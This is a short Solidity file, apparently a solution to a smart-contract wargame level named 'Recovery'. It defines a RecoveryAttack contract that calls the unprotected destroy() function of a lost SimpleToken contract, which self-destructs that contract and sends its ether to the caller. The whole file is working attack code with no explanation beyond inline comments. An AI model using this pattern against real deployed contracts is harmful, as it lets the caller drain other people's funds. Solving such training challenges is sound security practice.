// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Recovery.sol";

contract RecoveryAttack {
    address payable me;
    SimpleToken instance;

    function attack(address payable originalContract) public { //original contract is lost address 
        me = payable(msg.sender); // my address 
        instance = SimpleToken(originalContract); //instatiate the remote contract 
        instance.destroy(me); // call the method on the Token contract 
    }
}